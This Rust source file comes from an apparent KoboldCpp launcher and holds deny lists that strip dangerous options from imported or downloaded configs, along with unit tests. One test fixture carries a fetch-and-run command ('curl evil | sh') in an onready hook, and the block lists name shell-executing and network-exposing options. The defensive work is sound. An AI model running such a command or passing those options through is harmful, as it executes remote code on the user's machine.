//! Which KoboldCpp options a config may carry into a launch.
//!
//! Configs come from the user's own settings, but also from KoboldCpp templates on Hugging Face
//! and from files the user imports. Some KoboldCpp options run programs, expose the machine to a
//! network or read and write arbitrary files. The launcher never offers those, so they are always
//! removed before a start. A second group is fine when the user sets it in Advanced setup, but not
//! when it arrives inside a downloaded template or an imported file.

use super::Kcpps;

/// Never passed to KoboldCpp, whatever the source.
pub const NEVER: &[&str] = &[
    // Run a shell command / programs
    "onready", "allow_config_onready", "mcpfile", "agent", "agentload", "run_bundled_agent", "agent_base_url", "agent_api_key",
    // Load or write other configs and files
    "config", "baseconfig", "exportconfig", "exporttemplate", "savedatafile", "preloadstory", "unpack", "analyze", "testmemory",
    // Remote control and other networks
    "admin", "admindir", "adminpassword", "adminunloadtimeout", "routermode", "autoswapmode",
    "rpcmode", "rpcport", "rpchost", "rpcdevice", "rpccache", "rpctargets",
    "hordeconfig", "hordekey", "hordeworkername", "hordemodelname", "hordemaxctx", "hordegenlen",
    // Downloads without certificate checks
    "nocertify",
    // Esobold: only meaningful in admin or autoswap mode (blocked above)
    "admintextmodelsdir", "admindatadir", "admindocsdir", "adminallowhf",
    "autoswapmode_skiptextunload", "autoswapmode_skipsstunload", "autoswapmode_skipttsunload",
    "autoswapmode_skipembedunload", "autoswapmode_skipmusicunload", "autoswapmode_skipimageunload",
];

/// Allowed from Advanced setup and the user's presets, removed from templates and imports:
/// they make the server reachable from other computers or lock the user out.
pub const UNTRUSTED_ONLY: &[&str] = &[
    "host", "remotetunnel", "multiuser", "multiplayer", "password",
    // Esobold: file endpoints over the API, developer tools, the OpenLumara agent (runs tools and
    // shell commands on this computer; its web login defaults to admin:admin)
    "fsmaxsize", "fsdir", "fsdirect", "developerMode",
    "OpenLumara", "OpenLumara_TemporaryMode", "OpenLumara_configfile", "OpenLumara_datadir",
    "OpenLumara_sandboxfolder", "OpenLumara_backuppath", "OpenLumara_apiurl", "OpenLumara_requirelogin",
];

/// Esobold-only options can't go to KoboldCpp (it doesn't know them): removed in KoboldCpp mode.
pub fn strip_esobold_only(cfg: &mut Kcpps) -> Vec<String> {
    let keys: Vec<&str> = super::args::esobold_extras().iter().map(|a| a.dest.as_str()).collect();
    strip(cfg, &keys)
}

/// Remove what must never reach KoboldCpp. Returns the keys that were there.
pub fn strip_never(cfg: &mut Kcpps) -> Vec<String> {
    strip(cfg, NEVER)
}

/// For configs from outside (templates, imports): also the network/lock-out options.
pub fn strip_untrusted(cfg: &mut Kcpps) -> Vec<String> {
    let mut removed = strip(cfg, NEVER);
    removed.extend(strip(cfg, UNTRUSTED_ONLY));
    removed
}

fn strip(cfg: &mut Kcpps, keys: &[&str]) -> Vec<String> {
    // Only keys with a value that does something (KoboldCpp's defaults are empty/false/null).
    let set = |v: &serde_json::Value| !(v.is_null() || v == &serde_json::Value::Bool(false) || v.as_str() == Some("") || v.as_array().is_some_and(|a| a.is_empty()));
    let mut removed = Vec::new();
    for k in keys {
        if let Some(v) = cfg.remove(k)
            && set(&v)
        {
            removed.push((*k).to_string());
        }
    }
    removed
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dangerous_keys_go_user_network_choices_stay() {
        let mut k = Kcpps::parse(r#"{"model_param":"m.gguf","onready":"curl evil | sh","allow_config_onready":true,"mcpfile":"x.json","host":"0.0.0.0","remotetunnel":true,"hordekey":"","contextsize":8192}"#).unwrap();
        let removed = strip_never(&mut k);
        assert_eq!(removed, ["onready", "allow_config_onready", "mcpfile"], "empty hordekey is not reported");
        assert!(k.get("onready").is_none() && k.get("hordekey").is_none());
        assert!(k.get_bool("remotetunnel"), "the user's own choice stays");
        assert_eq!(k.get_i64("contextsize"), Some(8192));
        let removed = strip_untrusted(&mut k);
        assert_eq!(removed, ["host", "remotetunnel"]);
        assert_eq!(k.model().as_deref(), Some("m.gguf"));
    }

    #[test]
    fn every_listed_key_is_a_real_option() {
        // Typos would silently let an option through: all names must exist in KoboldCpp's table.
        for k in NEVER.iter().chain(UNTRUSTED_ONLY) {
            assert!(super::super::args::spec(k).or(super::super::args::esobold_spec(k)).is_some(), "{k} is not a KoboldCpp or Esobold option");
        }
        // Every Esobold extra is either offered or blocked, never silently passed through.
        let offered: Vec<String> = super::super::args::esobold_offered().into_iter().map(|a| a.dest).collect();
        for a in super::super::args::esobold_extras() {
            assert!(offered.contains(&a.dest) || NEVER.contains(&a.dest.as_str()), "{} is neither offered nor blocked", a.dest);
        }
        assert_eq!(offered.len(), 14);
    }
}
